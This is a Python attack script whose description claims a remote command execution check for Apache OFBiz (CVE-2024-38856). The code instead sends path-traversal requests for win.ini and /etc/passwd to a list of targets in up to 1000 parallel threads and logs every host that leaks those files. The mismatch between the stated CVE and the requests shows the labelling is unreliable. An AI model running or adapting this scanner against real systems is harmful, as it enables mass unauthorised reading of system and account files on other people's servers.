import requests,argparse,sys
from multiprocessing.dummy import Pool
import json
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="Apache OFBiz系统ProgramExport接口存在远程命令执行漏洞CVE-2024-38856")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(1000)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept':'*/*',
        'Connection':'Keep-Alive'

    }
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }

    url = target+'/client/cdnfile/1C/Windows/win.ini'
    url1 = target+'/client/cdnfile/C/etc/passwd'

    try:
        res = requests.get(url=url,headers=headers,proxies=proxies,verify=False).text
        res1 = requests.get(url=url1,headers=headers,proxies=proxies,verify=False).text
        if "files" in res or "root" in res1:
            with open('readfile.txt','a') as fp1:
                fp1.write(f"[+]{target} is veriable"+'\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server erro')

if __name__ =='__main__':
    main()